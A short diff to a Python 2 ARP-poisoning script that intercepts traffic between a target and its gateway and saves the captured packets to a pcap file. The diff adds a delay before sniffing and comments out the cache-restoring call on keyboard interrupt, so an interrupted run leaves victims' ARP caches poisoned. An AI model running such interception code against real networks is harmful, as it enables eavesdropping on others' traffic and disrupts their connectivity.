@@ -68,8 +68,9 @@ def main():
     else:
         print "[*] Target %s is at %s" % (target_ip, target_mac)
 
-    poison_thread = threading.Thread(target = poison_target, args=(gateway_ip, gateway_mac, target_ip, target_mac))
+    poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac, target_ip, target_mac))
     poison_thread.start()
+    time.sleep(2)
 
     try:
         print "[*] Starting sniffer for %d packets" % packet_count
@@ -78,7 +79,7 @@ def main():
         wrpcap('arprt.pcap', packets)
         restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
     except KeyboardInterrupt:
-        restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
+        #restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
         sys.exit(0)
 
 if __name__ == '__main__':
